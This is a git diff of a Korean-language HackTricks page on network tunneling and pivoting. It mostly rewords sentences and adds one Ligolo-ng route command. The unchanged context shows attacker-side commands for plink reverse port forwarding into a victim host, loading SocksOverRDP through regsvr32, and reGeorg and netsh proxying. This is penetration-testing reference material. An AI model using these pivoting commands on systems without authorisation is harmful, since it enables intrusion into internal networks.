@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
-클라이언트와 서버에 **같은 버전**을 사용해야 합니다.
+**클라이언트와 서버에 대해 동일한 버전을 사용해야 합니다.**
 
 ### socks
 ```bash
@@ -242,6 +242,12 @@ interface_list
 listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
+```
+### 에이전트의 로컬 포트 접근
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
 ## Rpivot
 
@@ -332,7 +338,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).
 
-이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리 머신의 포트로 포워딩하려면:
+이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서 접근 가능한 포트만 우리 머신의 포트로 포워딩하려면:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -364,7 +370,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받게 되고, **127.0.0.1:1080**에서 **수신** 대기할 것입니다.
+이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받을 것입니다. 그리고 **127.0.0.1:1080**에서 **수신**할 것입니다.
 
 **RDP**를 통해 **연결**하고 희생자 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드 및 실행합니다:
 ```
@@ -524,7 +530,7 @@ _필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._
 #### HTTP 호출 스니핑
 
 _XSS, SSRF, SSTI 등에 유용..._\
-stdout에서 직접 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서.
+stdout 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서 직접.
 
 #### 내부 HTTP 서비스 터널링
 ```bash
@@ -566,7 +572,7 @@ GCP 해킹 배우기 및 연습하기: <img src="../.gitbook/assets/grte.png" al
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
